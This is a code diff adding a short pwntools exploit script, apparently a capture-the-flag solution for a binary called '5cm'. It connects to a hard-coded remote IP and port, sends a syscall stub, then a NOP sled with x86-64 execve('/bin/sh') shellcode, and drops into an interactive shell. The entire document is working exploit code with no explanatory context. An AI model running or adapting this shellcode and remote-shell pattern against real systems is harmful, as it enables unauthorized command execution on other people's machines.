@@ -1,0 +1,10 @@
+
+#r = process('./5cm')
+r = remote('125.235.240.168', 27019)
+raw_input('?')
+
+shellcode = "\x48\x31\xC0\x50\x48\xBA\x2F\x62\x69\x6E\x2F\x73\x68\x00\x52\x54\x5F\x50\x50\x5E\x5A\xB0\x3B\x0F\x05"
+
+r.send("\x0f\x05")
+r.send("\x90"*20+shellcode)
+r.interactive()
